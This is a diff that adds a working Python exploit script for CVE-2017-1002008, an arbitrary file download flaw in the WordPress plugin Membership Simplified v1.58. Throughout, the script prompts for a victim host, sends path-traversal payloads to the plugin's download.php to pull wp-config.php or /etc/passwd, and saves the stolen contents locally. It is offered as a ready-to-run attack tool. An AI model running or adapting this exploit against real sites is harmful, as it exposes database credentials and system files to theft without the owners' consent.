@@ -1,0 +1,60 @@
+import requests
+import string
+import random
+from urlparse import urlparse
+
+print "---------------------------------------------------------------------"
+print "Wordpress Plugin Membership Simplified v1.58 - Arbitrary File Download\nDiscovery: Larry W. Cashdollar\nExploit Author: Munir Njiru\nWebsite: https://www.alien-within.com\nCVE-2017-1002008\nCWE: 23\n\nReference URLs:\nhttp://www.vapidlabs.com/advisory.php?v=187"
+print "---------------------------------------------------------------------"
+victim = raw_input("Please Enter victim host e.g. http://example.com: ")
+file_choice=raw_input ("\n Please choose a number representing the file to attack: \n1. Wordpress Config \n2. Linux Passwd File\n")
+if file_choice == "1":
+    payload="..././..././..././wp-config.php"
+elif file_choice == "2":
+    payload="..././..././..././..././..././..././..././..././etc/passwd"
+else:
+    print "Invalid Download choice, Please choose 1 or 2; Alternatively you can re-code me toI will now exit"
+    quit()  
+slug = "/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file="+payload
+target=victim+slug
+def randomizeFile(size=6, chars=string.ascii_uppercase + string.digits):
+    return ''.join(random.choice(chars) for _ in range(size))
+	
+def checkPlugin():
+    pluginExists = requests.get(victim+"/wp-content/plugins/membership-simplified-for-oap-members-only/download.php")
+    pluginExistence = pluginExists.status_code
+    if pluginExistence == 200:
+        print "\nI can reach the target & it seems vulnerable, I will attempt the exploit\nRunning exploit..."
+        exploit()
+    else:
+        print "Target has a funny code & might not be vulnerable, I will now exit\n"
+        quit()
+     
+def exploit():
+    
+    getThatFile = requests.get(target)
+    fileState = getThatFile.status_code
+    breakApart=urlparse(victim)
+    extract_hostname=breakApart.netloc	
+    randomDifferentiator=randomizeFile()
+    cleanName=str(randomDifferentiator)
+    if fileState == 200:
+	respFromThatFile = getThatFile.text
+	if file_choice == "1":
+		resultFile=extract_hostname+"_config_"+cleanName+".txt"
+		print resultFile
+		pwned=open(resultFile, 'w')
+		pwned.write(respFromThatFile)
+		pwned.close
+		print "Wordpress Config Written to "+resultFile
+	else:
+		resultFile=extract_hostname+"_passwd"+cleanName+".txt"
+		pwned=open(resultFile, 'w')
+		pwned.write(respFromThatFile)
+		pwned.close
+		print "Passwd File Written to "+resultFile
+    else: 
+	print "I am not saying it was me but it was me! Something went wrong when I tried to get the file. The server responded with: \n" +fileState
+  
+if __name__ == "__main__":
+    checkPlugin()
